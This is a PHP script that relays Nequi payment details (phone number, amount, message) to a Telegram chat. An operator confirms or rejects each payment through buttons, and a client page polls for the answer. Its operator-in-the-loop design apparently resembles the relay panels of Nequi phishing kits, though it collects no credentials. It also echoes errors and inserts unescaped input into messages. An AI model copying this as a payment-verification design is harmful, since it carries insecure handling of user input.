<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

$USED_FILE = 'used_transactions.json';

/* ============================================================
   🔥 CARGAR CONFIG COMO  TODOS TUS DEMÁS ARCHIVOS
   ============================================================ */
function loadConfig()
{
    $configFile = __DIR__ . '/../config.php';

    if (!file_exists($configFile)) return null;

    $config = require $configFile;

    if (!isset($config['bot_token']) || !isset($config['chat_id']))
        return null;

    return [
        'token' => $config['bot_token'],
        'chat_id' => $config['chat_id']
    ];
}

/* ============================================================
   📩 ENVIAR A TELEGRAM
   ============================================================ */
function sendToTelegram($token, $chatId, $text, $keyboard)
{
    $payload = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    $res = curl_exec($ch);
    curl_close($ch);

    return json_decode($res, true);
}

/* ============================================================
   ✏ EDITAR MENSAJE
   ============================================================ */
function editTelegramMessage($token, $chatId, $messageId, $newText)
{
    $payload = [
        'chat_id' => $chatId,
        'message_id' => $messageId,
        'text' => $newText,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['inline_keyboard' => []])
    ];

    $ch = curl_init("https://api.telegram.org/bot{$token}/editMessageText");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_POSTFIELDS => json_encode($payload)
    ]);

    curl_exec($ch);
    curl_close($ch);
}

/* ============================================================
   ⚙ MANEJO DE TRANSACCIONES
   ============================================================ */
function getTransactions()
{
    return file_exists($GLOBALS['USED_FILE'])
        ? json_decode(file_get_contents($GLOBALS['USED_FILE']), true)
        : [];
}

function saveTransaction($id, $data)
{
    $all = getTransactions();
    $all[$id] = $data;
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

function deleteTransaction($id)
{
    $all = getTransactions();
    unset($all[$id]);
    file_put_contents($GLOBALS['USED_FILE'], json_encode($all));
}

/* ============================================================
   🔥 Cargar configuración local
   ============================================================ */
$config = loadConfig();
if (!$config) {
    echo json_encode(['ok' => false, 'error' => '❌ No se pudo cargar config.php']);
    exit;
}

$BOT_TOKEN = $config['token'];
$CHAT_ID   = $config['chat_id'];

/* ============================================================
   📥 POST: Enviar mensaje al operador
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $data = json_decode(file_get_contents('php://input'), true);

    $tid      = $data['transactionId'] ?? ('TID_' . time());
    $telefono = $data['nequi'] ?? 'N/D';
    $monto    = $data['monto'] ?? '0';
    $mensaje  = $data['mensaje'] ?? '';

    $text  = "<b>💎 NEQUI - CONFIRMAR 💎</b>\n";
    $text .= "• 📱 Número: <code>{$telefono}</code>\n";
    $text .= "• 💰 Monto: <b>$ {$monto}</b>\n";
    $text .= "• 📝 Mensaje: {$mensaje}\n\n";
    $text .= "Operador, selecciona una opción:";

    $keyboard = [
        [
            ['text' => '✅ Pago aceptado', 'callback_data' => "si:{$tid}"],
            ['text' => '❌ Aún no pagó',   'callback_data' => "no:{$tid}"]
        ],
        [
            ['text' => '📸 Captura', 'callback_data' => "cap:{$tid}"]
        ]
    ];

    $res = sendToTelegram($BOT_TOKEN, $CHAT_ID, $text, $keyboard);

    if (!empty($res['ok'])) {
        saveTransaction($tid, [
            'tid' => $tid,
            'telefono' => $telefono,
            'monto' => $monto,
            'message_id' => $res['result']['message_id'],
            'created_at' => time(),
            'status' => 'pending'
        ]);
    }

    echo json_encode(['ok' => true, 'tid' => $tid]);
    exit;
}

/* ============================================================
   🔍 GET: Polling esperando respuesta del operador
   ============================================================ */
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['transactionId'])) {

    $tid = $_GET['transactionId'];

    $updates = json_decode(file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates"), true);

    $lastUpdateId = 0;

    if (!isset($updates['result'])) {
        echo json_encode(['ok' => false]);
        exit;
    }

    foreach ($updates['result'] as $update) {

        if (isset($update['update_id'])) {
            $lastUpdateId = $update['update_id'];
        }

        if (!isset($update['callback_query'])) continue;

        $cb     = $update['callback_query'];
        $dataCB = $cb['data'] ?? '';
        $from   = $cb['from']['username'] ?? $cb['from']['first_name'];

        $parts = explode(':', $dataCB);

        if (count($parts) !== 2 || $parts[1] !== $tid) continue;

        $accion = $parts[0];

        file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/answerCallbackQuery?callback_query_id={$cb['id']}");

        $t = getTransactions()[$tid] ?? null;
        if (!$t) continue;

        if ($accion === 'si') {
            $accionTexto = 'Pago aceptado';
            $clientAction = 'confirmado';
        } elseif ($accion === 'no') {
            $accionTexto = 'Aún no pagó';
            $clientAction = 'rechazado';
        } elseif ($accion === 'cap') {
            $accionTexto = 'Captura solicitada';
            $clientAction = 'captura';
        }

        $nuevoMensaje  = "<b>💎 NEQUI - CONFIRMAR 💎</b>\n";
        $nuevoMensaje .= "• 📱 Número: <code>{$t['telefono']}</code>\n";
        $nuevoMensaje .= "• 💰 Monto: <b>$ {$t['monto']}</b>\n\n";
        $nuevoMensaje .= "✅ Acción: <b>{$accionTexto}</b>\n";
        $nuevoMensaje .= "👤 Por: @$from";

        editTelegramMessage($BOT_TOKEN, $CHAT_ID, $t['message_id'], $nuevoMensaje);

        deleteTransaction($tid);

        if ($lastUpdateId > 0) {
            file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates?offset=" . ($lastUpdateId + 1));
        }

        echo json_encode(['ok' => true, 'action' => $clientAction]);
        exit;
    }

    if ($lastUpdateId > 0) {
        file_get_contents("https://api.telegram.org/bot{$BOT_TOKEN}/getUpdates?offset=" . ($lastUpdateId + 1));
    }

    echo json_encode(['ok' => false]);
    exit;
}

echo json_encode(['ok' => false, 'error' => '⛔ Método inválido']);
exit;
